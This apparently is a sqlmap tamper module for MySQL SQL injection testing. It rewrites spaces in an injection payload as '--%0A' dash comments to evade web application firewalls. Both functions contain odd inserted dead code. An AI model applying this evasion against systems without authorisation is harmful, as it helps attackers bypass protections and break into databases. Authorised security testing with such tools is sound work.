"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    if False:
        while True:
            i = 10
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        while True:
            i = 10
    "\n    Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')\n\n    Requirement:\n        * MySQL\n        * MSSQL\n\n    Notes:\n        * Useful to bypass several web application firewalls.\n\n    >>> tamper('1 AND 9227=9227')\n    '1--%0AAND--%0A9227=9227'\n    "
    retVal = ''
    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                retVal += '--%0A'
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]
    return retVal